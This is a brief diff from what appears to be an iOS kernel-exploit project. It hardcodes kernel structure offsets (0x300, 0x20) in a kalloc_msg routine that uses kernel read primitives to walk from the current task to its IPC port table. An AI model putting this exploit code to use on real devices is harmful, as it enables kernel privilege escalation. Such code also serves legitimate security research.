@@ -50,7 +50,7 @@ void *kalloc_msg(uint64_t size) {
 	}
 	uint64_t pr_task = get_current_task();
 	// sleep(2);
-	uint64_t itk_space_pac = kread64_kfd(pr_task + off_task_itk_space);
+	uint64_t itk_space_pac = kread64_kfd(pr_task + 0x300);
 	uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
 	NSLog(@"itk_space: %p",itk_space);
 	// sleep(2);
@@ -62,7 +62,7 @@ void *kalloc_msg(uint64_t size) {
 			NSLog(@"[-] invalid port name? 0x%x\n", port);
 			// sleep(2);
 		}
-	uint64_t is_table = kread64_smr_kfd(itk_space + off_ipc_space_is_table);
+	uint64_t is_table = kread64_smr_kfd(itk_space + 0x20);
 	NSLog(@"is_table: %p",is_table);
 	// sleep(2);
 	uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
